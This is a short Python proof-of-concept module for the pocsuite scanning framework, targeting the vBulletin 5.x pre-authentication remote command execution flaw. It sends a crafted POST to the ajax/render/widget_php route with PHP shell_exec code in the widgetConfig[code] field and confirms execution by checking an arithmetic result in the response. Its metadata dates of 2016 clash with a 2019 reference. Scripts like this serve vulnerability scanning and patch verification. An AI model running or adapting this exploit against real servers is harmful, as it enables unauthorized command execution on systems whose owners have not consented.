#!/usr/bin/env python
# coding: utf-8

from pocsuite.api.request import req #用法和 req 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.request import req
import string 
import random

class TestPOC(POCBase):
    vulID = '98077'  # ssvid
    version = '1'
    author = ['co0ontty']
    vulDate = '2016-09-25'
    createDate = '2016-09-25'
    updateDate = '2016-09-25'
    references = ['https://seclists.org/fulldisclosure/2019/Sep/31', 'https://www.seebug.org/vuldb/ssvid-98077']
    name = 'vBulletin 5.x 0day pre-auth 远程命令执行漏洞'
    appPowerLink = 'https://www.vbulletin.com/'
    appName = 'vBulletin'
    appVersion = 'vBulletin 5.x '
    vulType = '命令执行'
    desc = '''
        攻击者可以通过构造非法的请求实现远程命令执行的效果
    '''
    samples = ['']

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        target = self.url
        params = {"routestring":"ajax/render/widget_php"}
        random_int1 = random.randint(0,200000)
        random_int2 = random.randint(0,200000)
        params["widgetConfig[code]"] = "echo shell_exec('expr {} + {}'); exit;".format(random_int1,random_int2)
        r = req.post(target, data = params)
        if r.status_code == 200 and str(random_int1+random_int2) in r.text :
            result['result'] = {}
            result['result']['text'] = r.text
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
